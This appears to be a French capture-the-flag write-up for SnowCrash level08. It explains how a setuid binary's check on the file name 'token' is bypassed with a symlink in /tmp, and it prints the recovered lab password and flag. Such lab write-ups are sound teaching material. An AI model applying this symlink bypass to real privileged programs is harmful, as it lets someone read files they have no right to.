# Level08
## Observations

Dans ce level on trouve dans notre home directory:
- un binaire `level08` disposant d'un setuid bit permettant d'exécuté ce dernier en tant
qu'utilisateur `flag08`.
- un fichier, `token` ayant uniquement les droits de lecture/ecriture pour son propriétaire
`flag08`.

En lançant le binaire, on nous affiche un usage:
```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Si on essaye avec le fichier token:
```sh
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Si on essaye sur un fichier sur lequel on a le droit de lecture:
```sh
level08@SnowCrash:~$ ./level08 .profile
level08: Unable to open .profile: Permission denied
```

Si on essaye sur un fichier sur lequel tout le monde a le droit de lecture:
```sh
level08@SnowCrash:~$ ./level08 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
[...]
```

Enfin je peux analyser le binaire avec la commande strings:
```sh
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```

Je repère la ligne `token`, qui pourrait indiquer une condition sur le nom de fichier
token.

A ce stade, on peut supposer que ce programme peut lire un fichier sur lequel l'utilisateur
`flag08` a les droits de lecture, sauf si il s'appelle `token`.

> **Note:** Depuis le début du sujet, chaque home directory dispose des fichiers
> `.bashrc`, `.bash_logout` et `.profile` accessibles en lecture par leurs users
> correspondant. De plus le home directory de `flag08` est `/home/flag/flag08`.
> On peut donc supposer que `/home/flag/flag08/.profile` existe et qu'il n'est
> utilisable que par `flag08`.

```sh
level08@SnowCrash:~$ ./level08 /home/flag/flag08/.profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
[...]
```

## Résolution

Pour résoudre ce level, il va donc falloir trouver un moyen de lire `token`, sans
que celui-ci ne s'appelle `token`.

Les commandes `mv` et `cp` me seront inutiles ici, vu que je n'ai pas les permisiions de
lecture/ecriture.

Je peux essayer de créer un lien symbolique:
```sh
level08@SnowCrash:~$ ln -s ./token /tmp/toto
level08@SnowCrash:~$ ./level08 /tmp/toto
level08: Unable to open /tmp/toto: No such file or directory
level08@SnowCrash:~$ ls -l /tmp/toto
lrwxrwxrwx 1 level08 level08 7 Dec 12 22:19 /tmp/toto -> ./token
```

Vu mon message d'erreur j'essaie la même procédure avec un chemin absolu:
```sh
level08@SnowCrash:~$ rm /tmp/toto
level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/toto
level08@SnowCrash:~$ ls -l /tmp/toto
lrwxrwxrwx 1 level08 level08 24 Dec 12 22:20 /tmp/toto -> /home/user/level08/token
level08@SnowCrash:~$ ./level08 /tmp/toto
quif5eloekouj29ke0vouxean
```

J'essaie de me connecter au level09 avec le mot de passe `quif5eloekouj29ke0vouxean`,
c'est un echec.

Au `flag08`:
```sh
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

J'obtiens le flag, je peux passer au level suivant :)
